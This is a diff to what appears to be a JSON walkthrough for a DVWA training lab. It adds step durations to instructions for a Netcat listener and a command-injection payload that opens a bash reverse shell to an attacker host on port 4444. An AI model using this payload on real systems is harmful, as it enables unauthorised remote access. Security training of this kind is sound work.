@@ -27,13 +27,15 @@
     {
       "title": "Set up a listener in Kali",
       "command": "nc -lvnp 4444",
-      "explanation": "Start a Netcat listener on port 4444 to catch our reverse shell. Keep this terminal open."
+      "explanation": "Start a Netcat listener on port 4444 to catch our reverse shell. Keep this terminal open.",
+      "duration": "Runs until connection"
     },
     {
       "title": "Send reverse shell payload",
       "command": "127.0.0.1; bash -i >& /dev/tcp/172.20.0.5/4444 0>&1",
       "explanation": "Enter this in the DVWA form. It connects back to your Kali listener.",
-      "expected": "Your Netcat listener receives a shell connection"
+      "expected": "Your Netcat listener receives a shell connection",
+      "duration": "2-5 sec"
     },
     {
       "title": "Alternative: Use PHP reverse shell",
